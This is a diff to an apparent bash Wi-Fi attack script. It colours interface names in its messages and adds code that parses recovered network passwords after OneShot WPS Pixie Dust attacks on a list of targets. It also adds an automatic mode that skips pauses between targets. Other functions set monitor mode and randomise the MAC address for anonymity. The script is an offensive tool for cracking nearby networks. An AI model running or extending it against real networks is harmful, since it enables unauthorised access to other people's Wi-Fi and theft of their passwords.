@@ -245,30 +245,30 @@ esac
 
 set_managed() {
     iface=$1
-    printf "\n\e[0m[\e[93m*\e[0m] Putting $iface in managed mode... \n"
+    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in managed mode... \n"
     ip link set $iface down
     iw $iface set type managed 
     ip link set $iface up
-    printf "\n\e[0m[\e[92mi\e[0m] Enabled managed mode on $iface! \n"
+    printf "\n\e[0m[\e[92mi\e[0m] Enabled managed mode on \e[92m$iface\e[0m! \n"
 
 }
 
 set_mmode(){
     iface=$1
-    printf "\n\e[0m[\e[93m*\e[0m] Putting $iface in monitor mode... \n"
+    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in monitor mode... \n"
     ip link set $iface down
     iw $iface set monitor control
     ip link set $iface up
-    printf "\n\e[0m[\e[92mi\e[0m] Enabled monitor mode on $iface! \n"
+    printf "\n\e[0m[\e[92mi\e[0m] Enabled monitor mode on \e[92m$iface\e[0m! \n"
 }
 
 iface_macchanger(){
     iface=$1
-    printf "\n\e[0m[\e[93m*\e[0m] Changing MAC address on $iface... \n"
+    printf "\n\e[0m[\e[93m*\e[0m] Changing MAC address on \e[92m$iface\e[0m... \n"
     ip link set $iface down
     macchanger -r $iface &>/dev/null
     ip link set $iface up
-    printf "\e[0m[\e[92mi\e[0m] Changed MAC address on $iface! \n"
+    printf "\e[0m[\e[92mi\e[0m] Changed MAC address on \e[92m$iface\e[0m! \n"
 }
 
 wps_blackout(){
@@ -360,14 +360,36 @@ scan_accuracy: \e[92m$scan_accuracy\e[0m
     printf "\n\e[0m[\e[93m*\e[0m] Attacking network/s using OneShot... \n"
 
     y=0
-    while [ $y -lt ${#target_bssid[@]} ]
+    while [ $y -lt ${#target_bssid[@]} ];
     do  
         printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#target_bssid[@]}) Attacking ${target_ssid[$y]} (${target_bssid[$y]})\n\n"
         
         python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -F -w
+
+        if [ ! -f "$creds_path" ];
+        then
+            printf "\n\e[0m[\e[91m!\e[0m] Not found \n"
+        else
+            psk=$(cat $creds_path | awk '/BSSID: '${target_bssid[$y]}'/ {p = 4} p > 0 {print $0; p--}')
+            if printf $psk | grep -q "BSSID";
+            then
+                printf "\n\e[0m[\e[92mi\e[0m] Found ${target_ssid[$y]} password! \n"
+                printf "\n$psk"
+            else
+                printf "\n\e[0m[\e[91m!\e[0m] ${target_ssid[$y]} password not found! \n"
+            fi
+        fi
         
-        printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
-        read ener_empty_value
+        if [ $automode == 0 ];
+        then
+
+            if [ $y -lt $((${#target_bssid[@]}-1)) ];
+            then
+            printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
+            read ener_empty_value
+            fi
+        fi
+
         y=$((y+1))
     done 
 
@@ -378,7 +400,7 @@ scan_accuracy: \e[92m$scan_accuracy\e[0m
         do nmcli con up uuid $line &>/dev/null;    
         done
     fi
-    
+    back_to_menu
 }
 
 deauth_blackout(){
